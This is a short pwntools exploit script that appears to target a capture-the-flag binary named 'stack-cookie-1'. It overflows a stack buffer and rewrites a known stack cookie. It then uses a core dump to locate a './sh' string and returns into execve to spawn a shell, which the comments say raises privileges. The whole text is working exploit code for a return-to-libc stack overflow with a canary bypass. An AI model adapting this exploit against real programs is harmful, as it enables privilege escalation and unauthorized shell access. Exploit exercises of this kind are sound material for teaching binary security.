from pwn import *

# Requires ./sh is an executable that raise priv and spawn shell.

# GDB says buffer starts at ebp - 0x88
execve_addr = 0xf7eaf7e0 # From gdb

p = process(["./stack-cookie-1", "./sh"])

# GARBAGE ATTACK TO FIND /bin/sh,  Add cookie so no exit
inp = "a" * 0x84 + p32(0xfaceb00c) + "bbbb" + p32(0xaaaaaaaa) + "cccc" + p32(0xaaaaaaaa) + p32(0) + p32(0)
p.send(inp)
p.recv(0x100)
p.wait()
c = Core("./core")
sh_addr = c.stack.find("./sh")

p = process(["./stack-cookie-1", "./sh"])

# [0x88][ebp][retaddr][4 garbage bytes][arg1(/bin/sh)][arg2][arg3]
inp = "a" * 0x84 + p32(0xfaceb00c) + "bbbb" + p32(execve_addr) + "cccc" + p32(sh_addr) + p32(0) + p32(0)

# Launch attack
p.send(inp)
p.interactive()
quit()
